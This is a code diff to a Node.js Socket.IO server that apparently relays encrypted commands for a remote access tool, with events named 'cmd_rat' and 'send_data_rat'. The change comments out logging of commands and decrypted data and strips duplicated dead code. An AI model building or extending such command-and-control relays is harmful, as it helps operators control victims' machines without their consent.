@@ -62,16 +62,16 @@ io.on('connection', function(socket) {
 	socket.on('update_num_server' , function(data){
 		console.log('UPDATING FORW_NUM: '+data);
 		forw_num = data;
-		console.log(forw_num);
+		//console.log(forw_num);
 		io.emit('update_num',forw_num);
 	});
 	
 	socket.on('send_data_rat' , function(data){
-		console.log('MSG: '+data);
+		//console.log('MSG: '+data);
 	});
 	
 	socket.on('test_msg' , function(data){
-		console.log('MSG: '+data);
+		//console.log('MSG: '+data);
 	});
 	
 	
@@ -137,7 +137,7 @@ io.on('connection', function(socket) {
 	});
 	
 	socket.on('cmd_rat' , function(data){
-		console.log('cmd_rat: '+data);
+		//console.log('cmd_rat: '+data);
 		
 		const obj = Decryptest(data);
 		if(obj.Api == Apikey){
@@ -152,7 +152,7 @@ io.on('connection', function(socket) {
 	});
 	
 	socket.on('cmd_done' , function(data){
-		console.log('cmd_done_rat: '+data);
+		//console.log('cmd_done_rat: '+data);
 		
 		const obj = Decryptest(data);
 		if(obj.Api == Apikey){
@@ -167,7 +167,7 @@ io.on('connection', function(socket) {
 	});
 	
 	socket.on('broadcast' , function(data){
-		console.log('PHP DATA: '+data);
+		//console.log('PHP DATA: '+data);
 	});
 	
 	socket.on("disconnect", () => console.log("User Disconnected: "+socket.id));
@@ -197,121 +197,14 @@ var decryptedText = decryptedData.toString(CryptoJS.enc.Utf8);
 
 const obj = JSON.parse(decryptedText);
 
-console.log(obj.data);
+//console.log(obj.data);
 
 if(obj.Api == Apikey){
-	console.log(obj.Api);
+	//console.log(obj.Api);
 }
 
-console.log( `decryptedText = '${new String(decryptedText)}'`);
+//console.log( `decryptedText = '${new String(decryptedText)}'`);
 
 return obj;
 
 }
-
-function code_point(){
-	// Fixed the Api tkey to next one
-
-/*function call_php(data){
-	
-	const axios = require('axios')
-
-	const qs = require('qs');
-	axios.post('http://localhost/test/index.php',  qs.stringify({
-		'data': data,
-		'action': 'save'
-	}))
-	.then((res) => {
-	  console.log(`statusCode: ${res.statusCode}`)
-	  //console.log(res)
-	  //console.log(`statusCode: ${res.data}`)
-	})
-	.catch((error) => {
-	  //console.error(error)
-	})
-	
-}*/
-// Fixed the Api tkey to next one
-
-/*function call_php(data){
-	
-	const axios = require('axios')
-
-	const qs = require('qs');
-	axios.post('http://localhost/test/index.php',  qs.stringify({
-		'data': data,
-		'action': 'save'
-	}))
-	.then((res) => {
-	  console.log(`statusCode: ${res.statusCode}`)
-	  //console.log(res)
-	  //console.log(`statusCode: ${res.data}`)
-	})
-	.catch((error) => {
-	  //console.error(error)
-	})
-	
-}*/// Fixed the Api tkey to next one
-
-/*function call_php(data){
-	
-	const axios = require('axios')
-
-	const qs = require('qs');
-	axios.post('http://localhost/test/index.php',  qs.stringify({
-		'data': data,
-		'action': 'save'
-	}))
-	.then((res) => {
-	  console.log(`statusCode: ${res.statusCode}`)
-	  //console.log(res)
-	  //console.log(`statusCode: ${res.data}`)
-	})
-	.catch((error) => {
-	  //console.error(error)
-	})
-	
-}*/// Fixed the Api tkey to next one
-
-/*function call_php(data){
-	
-	const axios = require('axios')
-
-	const qs = require('qs');
-	axios.post('http://localhost/test/index.php',  qs.stringify({
-		'data': data,
-		'action': 'save'
-	}))
-	.then((res) => {
-	  console.log(`statusCode: ${res.statusCode}`)
-	  //console.log(res)
-	  //console.log(`statusCode: ${res.data}`)
-	})
-	.catch((error) => {
-	  //console.error(error)
-	})
-	
-}*/
-}
-
-// Fixed the Api tkey to next one
-
-/*function call_php(data){
-	
-	const axios = require('axios')
-
-	const qs = require('qs');
-	axios.post('http://localhost/test/index.php',  qs.stringify({
-		'data': data,
-		'action': 'save'
-	}))
-	.then((res) => {
-	  console.log(`statusCode: ${res.statusCode}`)
-	  //console.log(res)
-	  //console.log(`statusCode: ${res.data}`)
-	})
-	.catch((error) => {
-	  //console.error(error)
-	})
-	
-}*/
